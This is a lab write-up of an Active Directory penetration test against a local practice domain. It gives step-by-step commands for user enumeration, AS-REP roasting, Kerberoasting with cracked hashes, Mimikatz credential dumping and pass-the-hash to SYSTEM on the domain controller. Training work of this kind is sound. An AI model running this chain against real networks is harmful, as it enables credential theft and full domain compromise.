# EXERCISE — Assembling the Pieces: Attacking an AD Environment

This lab is a local Active Directory environment: a **Domain Controller** running Windows Server 2019 plus **two client workstations** (Windows 10 Enterprise, domain-joined) — closely resembling the AD setups seen in OSCP and practical enterprise exams.

**Objective:** use AD pen-testing skills to establish an initial foothold on a client machine, then escalate across multiple intermediate stages until we compromise a **Domain Administrator** — the ultimate administrative privilege across the domain. It is approached as a **black box**: enumerate, test and adapt on the fly.

> Work through it step by step across the **4 categories** below, noting every step and taking screenshots wherever required.

## Targets

```
DC        : 192.168.29.8
Machine 1 : 192.168.29.130   (USERPC2, RDP open)
Machine 2 : 192.168.29.129
```

![700](Pasted%20image%2020261016102938.png)

---

# 1. Initial Foothold → Normal user access

## Step 1 — Enumerate the Domain Controller

Organize a hierarchical directory structure (e.g. `ctf/active_directory` by target IP) to keep scans and notes tidy, then run an aggressive Nmap scan. `-Pn` is used because the target filters ICMP echo requests.

```
nmap -A -vv -p- -T5 -sC -Pn <DC IP>
```

![](Pasted%20image%2020261016103713.png)

Open ports characteristic of a Windows Domain Controller:

- **Port 53 (DNS)** — open → confirms this is a DC (DNS running).
- **Port 88 (Kerberos)** — open → Kerberos authentication is active, enabling ticket-based attacks and enumeration.
- **Ports 445 & 139 (SMB)** — open.
- **Port 3389 (RDP)** — open → RDP possible.
- **Ports 389 & 636 (LDAP/LDAPS)** — 389 unencrypted, 636 encrypted (LDAPS). Further confirms the DC role.

![](Pasted%20image%2020261016104317.png)

We get the domain FQDN:

```
FRIENDS.local
```

![](Pasted%20image%2020261016104501.png)

## Step 2 — enum4linux against the DC

```
enum4linux <DC IP>
```

Unauthenticated reconnaissance returns multiple "Access Denied" errors (restricted by default on the DC), but still extracts two critical pieces of intelligence.

Hostname of the DC — `FRIENDS-DC`:

![](Pasted%20image%2020261016103442.png)

NetBIOS **Domain Name** (`FRIENDS`) and the **Domain SID**:

![](Pasted%20image%2020261016103538.png)

> Harvesting the Domain SID is essential — we'll use it later for forging **Golden Tickets** / **Silver Tickets**.

## Step 3 — Brute-force usernames with Kerbrute

Because port 88 is open, we can enumerate valid domain accounts. Kerbrute sends Kerberos requests to the KDC: a non-existent account returns a specific error, while a valid username returns a different response — allowing reliable username enumeration **without triggering account lockouts**.

Download Kerbrute:

```
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64

chmod +x kerbrute_linux_amd64
```

Download the SecLists username list (Usernames > `xato-net-10-million-usernames.txt`):

```
wget https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt
```

Run user enumeration:

```
./kerbrute_linux_amd64 userenum xato-net-10-million-usernames.txt -d friends.local -t 25 --dc <DC IP>
```

Kerbrute immediately identifies the default built-in account **`administrator`**.

## Step 4 — Scan the client machines (in parallel)

```
nmap -A -vv -p- -T5 -sC -Pn <Machine1 IP>
nmap -A -vv -p- -T5 -sC -Pn <Machine2 IP>
```

![](Pasted%20image%2020261016112954.png)

Port 80 (HTTP) is closed on both. **RDP (3389) is open** on one of the machines (`192.168.29.130`). Unauthenticated `smbclient` access is rejected — no anonymous shares.

Meanwhile Kerbrute discovers more valid usernames:

![](Pasted%20image%2020261016113503.png)

Record every username/password you find in a file:

```
gedit users.txt
```

```
administrator
sbucky
tstark
```

## Step 5 — AS-REP Roasting

AS-REP Roasting works because some AD accounts have Kerberos **pre-authentication disabled** ("Do not require Kerberos preauthentication"). When it's disabled, anyone can request an `AS-REP` for that user without knowing their password and crack it offline.

```
impacket-GetNPUsers -dc-ip <DC IP> -usersfile users.txt FRIENDS.local/
```

Pre-authentication is enforced for `administrator` and `sbucky`, but **disabled for `tstark`** — we get his hash:

![](Pasted%20image%2020261016130646.png)

Copy the full hash (from `$krb5` to the end) into a file:

```
gedit tstark_asrep
```

```
$krb5asrep$23$tstark@FRIENDS.LOCAL:27a2ba03696fba94d06bc7345a45f991$efed2f1093a047231ca8d14f71da3553b7d221aa1f69a6d95ace53f42e4a02deedfa8bcadd2d140184b20362ba5ca574d19ed6556220bba704a658231d9af1aa7ded1ab514e86c684756298dd7f55eda33726ea85636765fbb0668d16cfc7bcbf2c020280240ad891cd0efd6ce7af3ab686e9ab7d37f702971a32e763ba573ab293e93907f8a50e11b9db9eee975802ee8a43b4129370746f9b301ed48cdbeab42b5bc046c8d598fc21bc64480585c08be742b9f303b1d99e0d9be91d4a3d06424144e6bad0eceb45515d09602eac68481bceb79c12a32d785dadd35a3b94c1bdf6a266a3a23d946ebf8be37b3fb
```

Crack it with John:

```
john --format=krb5asrep tstark_asrep --wordlist=/usr/share/wordlists/rockyou.txt
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ john --format=krb5asrep tstark_asrep --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password@123     ($krb5asrep$23$tstark@FRIENDS.LOCAL)     
1g 0:00:00:01 DONE (2026-10-16 03:41) 0.9433g/s 985358p/s 985358c/s 985358C/s REYNA213..PORTTER
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Recovered credentials — **`friends.local\tstark : Password@123`**.

From the Nmap scan we also get the computer name for Machine 1 (`.130`) → **`USERPC2`**:

![](Pasted%20image%2020261016131411.png)

---

# 2. Local Privilege Escalation → Local Admin / SYSTEM

## Step 6 — Map the domain with BloodHound

BloodHound is a graphical interface for mapping all domain objects and the relationships between them.

Instead of transferring `SharpHound.exe` to Windows and shuffling staging files back and forth, use **`bloodhound-python`** — a remote Python ingestor that authenticates, collects the data itself, and brings it back to Kali.

```
https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce
```

Install:

```
pipx install bloodhound-ce
```

Run (collection method `All`, DC as nameserver):

```
bloodhound-ce-python -u 'USERNAME' -p 'PASSWORD' -c All -d 'thm.red' -ns <DC IP>
```

> With `tstark`'s credentials: `bloodhound-python -u tstark -p Password@123 -c All -d friends.local -ns 192.168.29.8`

![](Pasted%20image%2020261016140638.png)

It finds the computer names (`USERPC1`, `USERPC2`, `FRIENDS-DC`) and the domain name:

![](Pasted%20image%2020261016140502.png)

It outputs four JSON files — `computers.json`, `domains.json`, `groups.json`, `users.json` — which we upload into the BloodHound GUI (**Upload Data**).

## Step 7 — Analyse the graph

**Find all Domain Admins** returns two accounts: the default `Administrator` and a custom user **`narendra.modi`** → `narendra.modi` becomes our ultimate target. The shortest path from `tstark` to `narendra.modi` returns no direct path, so we look for service-based attack vectors.

**List all Kerberoastable accounts** (Analysis > Kerberos Interaction):

![](Pasted%20image%2020261016163012.png)

Two entries:

- **`krbtgt`** — default on every domain.
- **`http.server`** — a custom service account with an SPN set up.

If we authenticate as a user and request a TGS using this account's SPN, we get a hash of the service. So we **Kerberoast `http.server`**. Click the user to view its SPN (`Service Principal Name`, registered as `techhacker.local`):

![555](Pasted%20image%2020261016163238.png)

## Step 8 — Kerberoast `http.server`

```
impacket-GetUserSPNs -request -dc-ip <DC IP> friends.local/<username of user>
```

Enter the user's password when prompted. We get the service account's TGS hash:

![](Pasted%20image%2020261016164541.png)

```
$krb5tgs$23$*http.server$FRIENDS.LOCAL$friends.local/http.server*$d7b42e8a33c486a6346567b721ad92d8$bae65ad2250462eb36bd940d5baf16a0d3afe691419d9db21bf3a0c7c0fcb376b3d97a5b191ffa8de8aa79cdf3398948b610ee74e48127d9afa2c639181f4984eec1120b103b9d759f61d20db827b58a1d6f91e36a114a2ca8f778b99f054893573fcf21e78e7a3afcad37d680bac859913c5c824859b9d2c8e6eb9d7b940e0509cd4b282ebdff2a99da6f3772ae5fd672ee1caf8ce229f30b3de8fa2ba7484ba3ca981a3f3264f6769e8e27f890dbe1afc75ba13a85cdc3aaa3df438d8078a2cef7922a52459caeb6e37228bba63bf0958e7dbc7a30cdec8f4c6edc3ff160a792f6c9526ce72a6bb49971a23e58425c53ba5c9bc113bb23fd1541424c74dfe61895b816c053ccb55b9adbd5cad4f00cd5185584cf0ffeb16528e5b574cd257e5992e932270b6de7d7ffd2ae3bc0dbf6f22c95489ab32a1c1639009f114fe7db4bd2446a10386693a1313c32af2543899e598907c2f5c2f042b705dd24eb33708a907b1a80d7bba1a14c36c7cf678f65f67a0d1e965eb659c33b4f97f0a8a42955f09e58f0da5b97611cfffba2396007d944df4e27392e603dc6bd5f7ea9a6283851649c1f6b32883aa3cbc86f9e1dd5da2ba8dbc09ebafc7fe733ac2706037bbe4be6724a3f6994a29140c6058c75b3a07f58dd33ac24836d46a4fd4439b8dcedfc83d07d9c4d24ef8708a1c2a103b914c776a40eca69744c31fcc51249c87948de25dfa80a2f0a47b456b0b9d65962c3fd83e8e6ac2ce7e74e639d199175fae51cada74ce8ac7f5737f3c74b89841c079c937a4b6ebef3e688533869ab64f465b632c7e71048f79531209653cab38d1ff53cdc595ec932b559ec7c4ec7ada0a46ef02bed15a0d8f9827a6ef069e1b78e4a38b318d2bce23df5e56a3ad57d2c394a5c52d34d657f8f3ba3fad21d525a2ac454e0bfd27336ec3ac69c8a875ed902b4d8d05e38a5185c59698dc1b34cb12109cc8f8cea3caf8386e7e52432dfb6a3bc29ca7d24e74d79c999e8f8e14da1a85029a2ab6d1be66c3ec5244d34ce2f477e076aa949e36ad3adaab5e3a54310be2e976ceb3ac3279253dbbf04eaca4dda337e08d1f2f20a274ed68c4bd9da02e4f60ac5f89b3066bbfbc8639df365e5247ac35a096a5e99a8698a395c42bc4753eba2f9d42a91a691ab1facc432cfc8eb34cae3c9644da575bfd7723b75f8e2d43bc6af3427e676edaf17e6913929d940efea61b42aa540185ba7266804d2896b427ba74600b95801d95be1636cfd5f0b3fd6e91d50af65e43b510c53896574a653f602fa6fac006e3fe4d07159a8816c0e8067222c9e22cad23ed2
```

Crack it with John:

```
john --format=krb5tgs hello --wordlist=/usr/share/wordlists/rockyou.txt
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ john --format=krb5tgs hello --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Iloveyou07       (?)     
1g 0:00:00:07 DONE (2026-10-16 07:37) 0.1257g/s 1393Kp/s 1393Kc/s 1393KC/s Iluvdogs3..Ilovemy2girls
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Recovered credentials — **`http.server : Iloveyou07`**.

---

# 3. Lateral Movement → Access another machine

## Step 9 — RDP into the client with the service account

BloodHound only shows `http.server` in Domain Users — but BloodHound maps *domain* objects and does not reflect *local* machine groups stored in a workstation's local SAM. RDP (3389) was open on Machine 1 (`192.168.29.130`), so connect:

```
xfreerdp /v:192.168.29.130 /u:http.server /p:Iloveyou07 /cert:ignore /dynamic-resolution
```

## Step 10 — Check local group membership

```
whoami /groups
```

![](Pasted%20image%2020261016171444.png)

We are a member of the **Administrators** group! Confirm who else is in it:

```
net localgroup Administrators
```

![](Pasted%20image%2020261016183627.png)

Our user (`http.server`) is listed. So we first took a normal user (`tstark`), then Kerberoasted to a user (`http.server`) that happens to be a **local admin** on this client machine.

> By chaining **AS-REP Roasting → Kerberoasting**, we escalated to local administrator on a client workstation. Now we can perform post-exploitation: credential / ticket / hash harvesting and forging.

## Step 11 — Dump LSASS memory with Mimikatz

A pre-staged copy of `mimikatz.exe` is in `C:\Users\http_server`. Open **CMD as administrator** ("Run as administrator") and launch it:

```
.\mimikatz.exe
privilege::debug
```

Dump credentials of currently logged-in users:

```
sekurlsa::logonPasswords
```

![](Pasted%20image%2020261016184900.png)

Our RDP session shows under session type **`RemoteInteractive`**. Scrolling through, we find an in-memory session for Domain Admin **`narendra.modi`** under session type **`Interactive`** (a local logon) — his NTLM hash was cached in LSASS because he previously logged in here. We confirm he's a Domain Admin by searching his username in BloodHound:

![](Pasted%20image%2020261016185130.png)

Copy the NTLM hash:

```
NTLM : 3a2a7de01dfa4cb74a0f3dedcc8c75bd
```

---

# 4. Domain Privilege Escalation → Domain Admin / DC compromise

## Step 12 — Pass-the-Hash to the Domain Controller

Save the copied hash:

```
gedit newhash
```

Pass the hash against the DC with Impacket's psexec:

```
impacket-psexec <Domain admin username>@<DC IP> -hashes :<NTLM hash>
```

![](Pasted%20image%2020261016185928.png)

The utility connects to the DC over SMB, authenticates with the NTLM hash, uploads the service binary, and returns an interactive shell. We get **`nt authority\system`** on the Domain Controller.

```
whoami
```
→ `nt authority\system`

**COMPLETED** — full Domain Administrator dominance; the AD environment is fully owned.

---

# End-to-End Attack Chain Summary

1. **Reconnaissance** — Nmap + `enum4linux` on the DC → open ports (88, 389, 3389, 445, 53, 636), domain `friends.local`, and the Domain SID.
2. **User Enumeration** — Kerbrute brute-forces valid usernames: `administrator`, `sbucky`, `tstark`.
3. **AS-REP Roasting** — `GetNPUsers` finds `tstark` has pre-auth disabled; dump the AS-REP ticket and crack with John → `Password@123`.
4. **BloodHound Ingestion** — `bloodhound-python` with `tstark`'s creds → two Domain Admins (`Administrator`, `narendra.modi`) and Kerberoastable account `http.server`.
5. **Kerberoasting** — request the SPN ticket (`techhacker.local`) for `http.server` with `GetUserSPNs` and crack with John → `Iloveyou07`.
6. **Workstation Compromise** — RDP into `USERPC2` (192.168.29.130); `http.server` is in local `BUILTIN\Administrators` → local admin.
7. **LSASS Credential Harvesting** — Mimikatz `sekurlsa::logonpasswords` as local admin finds Domain Admin `narendra.modi`'s cached session and dumps his NTLM hash.
8. **Pass-the-Hash Domain Dominance** — `psexec` with `narendra.modi`'s NTLM hash authenticates to the DC → shell as `NT AUTHORITY\SYSTEM`.

---

# Practical Real-World Insights

This chain was relatively streamlined. Real-world assessments and advanced certification environments can introduce extra layers of complexity — such as **Group Policy Preferences (GPP)**, **Group Managed Service Accounts (gMSA)**, **constrained delegation**, and **custom PowerShell scripts**.

The core concepts here provide the practical foundation for AD penetration testing in OSCP and enterprise environments. Success relies on consistent hands-on practice — solving AD machines on platforms like Hack The Box and reviewing CTF walkthroughs.
